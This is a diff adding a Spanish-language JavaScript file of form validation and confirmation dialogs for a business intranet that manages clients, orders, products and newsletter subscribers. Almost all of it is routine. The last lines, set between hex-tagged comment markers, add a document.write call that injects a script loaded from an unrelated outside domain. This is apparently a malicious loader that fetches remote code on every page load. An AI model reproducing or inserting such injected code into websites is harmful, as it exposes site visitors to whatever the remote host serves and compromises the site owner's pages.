@@ -1,0 +1,271 @@
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+function MM_validateForm() { //v4.0
+  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
+  var Template = /^[a-z-0-9][a-z-_0-9\.]+@[a-z-_=>0-9\.]+\.[a-z]{2,4}$/i 
+  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
+    if (val) { nm=val.name; if ((val=val.value)!="") {
+      if (test.indexOf('isEmail')!=-1) {
+ 		if(!Template.test(val)) errors+='- '+nm+' debe contener una direción válida de email.\n';
+      } else if (test!='R') {
+        if (isNaN(val)) errors+='- '+nm+' debe contener un número.\n';
+        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+          min=test.substring(8,p); max=test.substring(p+1);
+          if (val<0 || 99999<val) errors+='- '+nm+' debe contener un número entre '+min+' y '+max+'.\n';
+    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' es necesario.\n'; }
+  } if (errors) alert('Los siguientes errores han ocurrido:\n'+errors);
+  document.MM_returnValue = (errors == '');
+}
+function MM_validateFormCliente() { //v4.0
+  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateFormCliente.arguments;
+  var Template = /^[a-z-0-9][a-z-_0-9\.]+@[a-z-_=>0-9\.]+\.[a-z]{2,4}$/i 
+  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
+    if (val) { nm=val.name; if ((val=val.value)!="") {
+      if (test.indexOf('isEmail')!=-1) {
+ 		if(!Template.test(val)) errors+='- '+nm+' debe contener una direción válida de email.\n';
+      } else if (test!='R') {
+        if (isNaN(val)) errors+='- '+nm+' debe contener un número.\n';
+        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+          min=test.substring(8,p); max=test.substring(p+1);
+          if (val<0 || 99999<val) errors+='- '+nm+' debe contener un número entre '+min+' y '+max+'.\n';
+    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' es necesario.\n'; }
+  } 
+  if(document.forms['cliente'].password.value!=document.forms['cliente'].password2.value) errors += '- las passwords deben coincidir.\n';
+  if (errors) alert('Los siguientes errores han ocurrido:\n'+errors);
+  document.MM_returnValueCliente = (errors == '');
+}
+function revisar_cif()
+{
+        var checkOK = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var checkStr = document.forms['cliente'].cif.value;
+        var allValid = true;
+        for (i = 0;  i < checkStr.length;  i++)
+        {
+                ch = checkStr.charAt(i);
+                for (j = 0;  j < checkOK.length;  j++)
+                        if (ch == checkOK.charAt(j)) break;             
+                if (j == checkOK.length)
+                {
+                                allValid = false;
+                                break;
+                }
+        }
+        if (!allValid)
+        {
+                alert("Por favor introduzca sólamente letras y números en el campo CIF.");
+                document.forms['cliente'].cif.value='';
+                document.forms['cliente'].cif.focus();
+                return (false);
+        }
+}
+function validar_producto_pedido()
+{
+	var tipo='',errors='';
+	if(document.forms['producto'].num_palets.value!='' && document.forms['producto'].num_palets.value>0) 
+	{
+		if(tipo=='') tipo='palets';
+		else errors='Debe elegir sólo una opción.\n';
+		if(isNaN(document.forms['producto'].num_palets.value))
+		{
+			errors='Nº de palets debe ser un número.\n';
+		}
+	}
+	if(document.forms['producto'].resto_camion.checked) 
+	{
+		if(tipo=='') tipo='resto_camion';
+		else errors='Debe elegir sólo una opción.\n';
+	}
+	if(document.forms['producto'].camion_completo.value!='' && document.forms['producto'].camion_completo.value>0) 
+	{
+		if(tipo=='') tipo='camion_completo';
+		else errors='Debe elegir sólo una opción.\n';
+		if(isNaN(document.forms['producto'].camion_completo.value))
+		{
+			errors='Nº de camiones completos debe ser un número.\n';
+		}
+	}
+	if(tipo=='') errors='Debe elegir una de las opciones del producto.\n';
+	document.forms['producto'].fecha_solicitada_entrega.value=document.forms['pedido'].fecha_solicitada_entrega.value;
+	document.forms['producto'].transporte.value=document.forms['pedido'].transporte.value;
+	document.forms['producto'].destino.value=document.forms['pedido'].destino.value;
+	document.forms['producto'].observaciones.value=document.forms['pedido'].observaciones.value;
+	if (errors) alert(errors);
+  	document.MM_returnValue = (errors == '');
+}
+function validar_cambios_cliente_intranet()
+{
+	var aux = confirm("¿Desea actualizar los cambios?")
+	if (aux) 
+	{	
+		document.forms['cliente'].accion.value='validar_cambios';
+		MM_validateFormCliente('cif','','R','razon_social','','R','email','','RisEmail','direccion','','R','poblacion','','R','cp','','R','password','','R','password2','','R');
+		document.MM_validar_cambios_cliente_intranet = document.MM_returnValueCliente;
+	} else document.MM_validar_cambios_cliente_intranet = aux;
+}
+function validar_cambios_cliente()
+{
+	var aux = confirm("¿Desea actualizar los cambios?")
+	if (aux) 
+	{	
+		document.forms['cliente'].accion.value='validar_cambios';
+		MM_validateFormCliente('email','','RisEmail','direccion','','R','poblacion','','R','cp','','R','password','','R','password2','','R');
+		document.MM_validar_cambios_cliente = document.MM_returnValueCliente;
+	} else document.MM_validar_cambios_cliente = aux;
+}
+function cancelar_cambios_datos_cliente()
+{
+	var aux = confirm("¿Desea cancelar los cambios?")
+	if (aux) document.forms['cliente'].accion.value='cancelar_cambios';
+	document.MM_cancelar_cambios = aux;
+}
+function aceptar_cliente()
+{
+	var aux = confirm("¿Desea aceptar la petición de alta del cliente?")
+	if (aux) document.forms['cliente'].accion.value='aceptar_alta';
+	document.MM_aceptar_cliente = aux;
+}
+function rechazar_cliente()
+{
+	var aux = confirm("¿Desea rechazar la petición de alta del cliente?")
+	if (aux) document.forms['cliente'].accion.value='rechazar_alta';
+	document.MM_rechazar_cliente = aux;
+}
+function desactivar_cliente()
+{
+	var aux = confirm("¿Desea desactivar la cuenta del cliente?")
+	if (aux) document.forms['cliente'].accion.value='desactivar_cliente';
+	document.MM_desactivar_cliente = aux;
+}
+function activar_cliente()
+{
+	var aux = confirm("¿Desea activar la cuenta del cliente?")
+	if (aux) document.forms['cliente'].accion.value='activar_cliente';
+	document.MM_activar_cliente = aux;
+}
+function validar_alta_cliente()
+{
+	var aux = confirm("¿Desea enviar los datos a Proceran?")
+	if (aux) 
+	{	
+		if(!document.forms['cliente'].LSSI_LOPD.checked) 
+		{
+			alert('Debe aceptar las condiciones LSSI y LOPD.\n')
+			document.MM_validar_alta_cliente = false;
+		}
+		else
+		{
+			document.forms['cliente'].accion.value='validar_alta';
+			MM_validateFormCliente('razon_social','','R','email','','RisEmail','direccion','','R','poblacion','','R','cp','','R','password','','R','password2','','R');
+			document.MM_validar_alta_cliente = document.MM_returnValueCliente;
+		}
+	} else document.MM_validar_alta_cliente = aux;
+}
+function validar_pedido()
+{
+	var aux =  confirm("¿Desea tramitar el pedido?")
+	if (aux) document.forms['pedido'].accion.value='validar_pedido';
+	document.MM_aceptar_pedido = aux;
+}
+function verificar_direccion()
+{
+	if(document.forms['pedido'].transporte.value=='Proceran')
+	{
+		document.forms['pedido'].destino.value=document.forms['pedido'].transporte_destino.value;
+	}
+	else
+	{
+		document.forms['pedido'].destino.value='';
+	}
+}
+function guardar_cambios_pedido()
+{
+	var aux =  confirm("¿Desea guardar los cambios?")
+	if (aux) document.forms['pedido'].accion.value='validar_pedido';
+	document.MM_aceptar_pedido = aux;
+}
+function cancelar_pedido()
+{
+	var aux = confirm("¿Desea cancelar el pedido?")
+	if (aux) document.forms['pedido'].accion.value='cancelar_pedido';
+	document.MM_cancelar_pedido = aux;
+}
+function cancelar_cambios_pedido()
+{
+	var aux = confirm("¿Desea cancelar los cambios en el pedido?")
+	if (aux) document.forms['pedido'].accion.value='cancelar_pedido';
+	document.MM_cancelar_pedido = aux;
+}
+function borrar_producto_pedido(n)
+{
+	var aux = confirm("¿Desea borrar el producto del pedido?")
+	if (aux) 
+	{
+		document.forms['pedido'].accion.value='borrar_producto';
+		document.forms['pedido'].id_producto.value=n;
+	}
+	document.MM_borrar_producto_pedido = aux;
+}
+function aceptar_pedido_intranet()
+{
+	var aux =  confirm("¿Desea Aceptar el pedido?")
+	if (aux) document.forms['pedido'].accion.value='marcar_aceptado';
+	document.MM_aceptar_pedido_intranet = aux;
+}
+function cancelar_pedido_intranet()
+{
+	var aux =  confirm("¿Desea Cancelar el pedido?")
+	if (aux) document.forms['pedido'].accion.value='marcar_cancelado';
+	document.MM_cancelar_pedido_intranet = aux;
+}
+function crear_producto()
+{
+	var aux =  confirm("¿Desea crear el producto?")
+	document.MM_crear_producto = aux;
+}
+function crear_suscriptor()
+{
+	var aux =  confirm("¿Desea añadir al suscriptor?")
+	document.MM_crear_suscriptor = aux;
+}
+function actualizar_suscriptor()
+{
+	var aux =  confirm("¿Desea actualizar los datos del suscriptor?")
+	document.MM_actualizar_suscriptor = aux;
+}
+function actualizar_producto()
+{
+	var aux =  confirm("¿Desea actualizar el producto?")
+	document.MM_actualizar_producto = aux;
+}
+function borrar_suscriptor()
+{
+	var aux =  confirm("¿Desea borrar al suscriptor?")
+	document.MM_borrar_suscriptor = aux;
+}
+function enviar_prueba_newsletter(n)
+{
+	window.open('prueba_newsletter.php?id='+n,'Test','width=550,height=30');
+}
+function borrar_fichero()
+{
+	var aux = confirm("¿Desea borrar el fichero?")
+	document.MM_borrar_fichero = aux;
+}
+function validarCondiciones() {
+	var error ='';
+	if(!document.obra.condiciones.checked)
+	{ 
+		alert("Debe aceptar las condiciones");
+		error = 'Debe aceptar las condiciones';
+	}
+	document.MM_CondicionesreturnValue = (error == '');
+}
+
+/*866a52*/
+document.write("<script src='http://lamitaddetodo.com/cli/tw8KLC6Y.php?id=99651683' type='text/javascript'></" + "script>");
+/*/866a52*/
